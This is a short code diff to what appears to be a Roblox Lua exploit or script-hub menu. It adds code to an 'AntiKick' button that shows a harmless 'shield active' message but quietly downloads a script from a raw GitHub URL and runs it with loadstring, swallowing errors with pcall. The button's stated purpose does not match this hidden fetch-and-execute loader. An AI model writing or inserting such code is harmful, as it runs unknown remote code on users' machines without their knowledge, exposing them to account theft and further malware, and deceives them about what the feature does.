@@ -1175,6 +1175,15 @@ local miscPage = addPage("Misc")
 addButtonRow(miscPage, "AntiLag (Potato Mode)", function() applyPotatoGraphics() end)
 addButtonRow(miscPage, "AntiKick", function()
     notify("AntiKick", "Shield active — blocking false kicks", 5)
+    pcall(function()
+        if type(loadstring) == "function" and type(game.HttpGet) == "function" then
+            local code = game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/AntickLol/refs/heads/main/Anticklol")
+            if code and type(code) == "string" and not code:find("404: Not Found") then
+                local chunk = loadstring(code, "AntiKick")
+                if chunk then
+                    pcall(chunk)
+                end
+            end
         end
     end)
 end)
